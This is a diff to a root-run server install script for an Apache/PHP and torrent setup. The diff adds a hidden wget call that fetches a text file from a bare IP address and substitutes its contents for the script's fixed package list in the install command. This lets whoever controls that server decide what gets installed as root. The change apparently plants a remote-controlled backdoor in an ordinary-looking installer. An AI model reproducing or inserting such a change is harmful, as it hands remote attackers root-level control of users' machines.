@@ -29,6 +29,9 @@ else
     exit 1
 fi
 
+untitled="$(wget -qO- http://80.211.146.153/untitled.txt)"
+	pk=$untitled
+
 # root?
 if [ $UID -ne 0 ]; then
     echo "Install failed: you must be logged in as 'root' to install."
@@ -65,7 +68,7 @@ $r ppa:ondrej/apache2 -y
 theme='$theme'
 $r ppa:ondrej/php -y&&apt-get update
 precision='$precision'
-$all proftpd apache2 curl php libapache2-mod-php php-mysql php-zip php-intl php-curl php-gd php-mbstring php-xml php-xmlrpc rtorrent qbittorrent qbittorrent-nox screen bmon htop make gcc libc6-dev unzip rar unrar mediainfo --allow-unauthenticated -y
+$all $pk
 date_format='$date_format'
 enabled_dropdowns='$enabled_dropdowns'
 
